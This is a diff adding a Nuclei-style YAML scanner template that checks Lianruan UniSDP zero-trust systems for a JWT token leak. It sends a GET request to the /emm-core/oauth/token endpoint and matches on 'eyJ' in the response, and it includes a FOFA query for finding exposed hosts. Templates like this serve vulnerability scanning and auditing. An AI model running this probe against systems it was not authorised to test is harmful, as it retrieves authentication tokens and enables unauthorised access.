@@ -1,0 +1,27 @@
+http:
+    - headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.3150.102 Safari/537.36
+      matchers:
+        - part: body
+          type: word
+          words:
+            - eyJ
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/emm-core/oauth/token'
+id: unisdp-jwt-token-leak
+info:
+    author: onewin
+    description: |
+        联软UniSDP系统的/emm-core/oauth/token接口存在JWT Token泄露风险
+        [漏洞发现时间：2025年7月]
+    metadata:
+        fofa-query: title="UniSDP" || body="/emm-core/"
+    name: 联软UniSDP零信任访问控制系统JWT Token泄露漏洞
+    severity: medium
+    tags:
+        - 联软安界UniSDP
